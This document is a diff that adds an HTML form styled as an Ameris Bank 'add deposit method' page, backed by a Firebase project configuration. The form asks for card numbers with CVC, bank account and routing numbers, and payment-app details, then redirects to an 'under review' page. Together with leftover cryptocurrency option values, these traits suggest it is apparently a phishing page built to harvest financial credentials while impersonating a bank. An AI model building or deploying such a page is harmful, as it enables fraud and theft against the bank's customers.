@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Add Deposit Method - Ameris Bank</title>
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="Ameris-add-deposit-method-design.css">
+</head>
+<body>
+  <div class="payment-method-container">
+    <h2>Pick a deposit method</h2>
+
+    <!-- Credit/Debit Card Option -->
+    <div class="payment-method" id="card-option">
+      <label>
+        <input type="radio" name="payment" checked>
+        <span class="radio-label">
+          <i class="fas fa-credit-card"></i> Credit or Debit Card
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" class="payment-icon">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard" class="payment-icon">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="AMEX" class="payment-icon">
+        </span>
+      </label>
+      <div class="card-details">
+        <input type="text" placeholder="Cardholder Name" class="input-field">
+        <input type="text" placeholder="Card Number" maxlength="16" class="input-field">
+        <div class="card-row">
+          <input type="text" placeholder="MM / YY" class="input-field small">
+          <input type="text" placeholder="CVC" class="input-field small">
+        </div>
+      </div>
+    </div>
+
+    <!-- Bank Option -->
+    <div class="payment-method" id="paypal-option">
+      <label>
+        <input type="radio" name="payment">
+        <span class="radio-label">
+          <i class="fa fa-bank"></i> Bank
+        </span>
+      </label>
+      <div class="card-details">
+        <input type="text" placeholder="Bank name" class="input-field">
+        <input type="number" placeholder="Account Number" maxlength="12" class="input-field">
+        <div class="card-row">
+          <input type="number" placeholder="Routing Number" class="input-field small">
+          <input type="text" placeholder="Account type" class="input-field small">
+        </div>
+      </div>
+    </div>
+
+    
+
+     <!-- Online Banking Option -->
+     <div class="payment-method" id="crypto-option">
+      <label>
+        <input type="radio" name="payment">
+        <span class="radio-label">
+          <i class="fa fa-bank"></i> Online Banking
+          <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_Cash_app_logo.svg" alt="Cash App Logo" class="payment-icon">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/PayPal_2024_%28Icon%29.svg" alt="PayPal Logo" class="payment-icon">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Venmo_Logo.svg" alt="Venmo Logo" class="payment-icon">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4c/Zelle_logo.svg" alt="Zelle Logo" class="payment-icon">
+        </span>
+      </label>
+      <div class="crypto-details" style="display: none;">
+        <select class="input-field">
+          <option value="bitcoin">Cash App</option>
+          <option value="ethereum">PayPal</option>
+          <option value="litecoin">Venmo</option>
+          <option value="litecoin">Zelle</option>
+        </select>
+        <input type="text" placeholder="Email address" class="input-field">
+        <input type="number" placeholder="Account number (PayPal, Cash app only)" class="input-field">
+        <input type="number" placeholder="Routing number (PayPal, Cash app only)" class="input-field">
+      </div>
+    </div>
+
+    
+
+    <!-- Submit Button -->
+    <a href="Ameris-add-deposit-method-under-review.html" class="add-payment-link">
+    <button id="submit-btn">Add Deposit Method</button>
+    </a>
+  </div>
+
+  <!-- Custom JavaScript -->
+  <script src="Ameris-add-deposit-method-js.js"></script>
+  <script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+  
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyC6jnc3iJhgNpkyRkIJsiJ8pJbtRYznna8",
+      authDomain: "ameris-bank-b9f6a.firebaseapp.com",
+      projectId: "ameris-bank-b9f6a",
+      storageBucket: "ameris-bank-b9f6a.firebasestorage.app",
+      messagingSenderId: "796415015356",
+      appId: "1:796415015356:web:084cc0c08f50a8164893b9"
+    };
+  
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+  </script>
+  
+  
+</body>
+</html>
